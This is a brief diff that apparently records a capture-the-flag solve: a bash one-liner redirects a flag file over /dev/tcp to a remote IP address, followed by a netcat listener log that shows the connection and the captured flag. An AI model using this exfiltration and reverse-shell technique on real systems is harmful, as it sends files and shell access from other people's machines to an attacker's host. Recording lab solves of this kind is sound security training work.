@@ -1,0 +1,6 @@
+cat flag.txt >& /dev/tcp/51.68.122.93/1339 0>&1
+
+daemon@vps704387:~$ nc -lvp 1339
+Listening on [0.0.0.0] (family 0, port 1339)
+Connection from ec2-34-208-211-186.us-west-2.compute.amazonaws.com 42710 received!
+gigem{r3v3r53_5h3ll5}
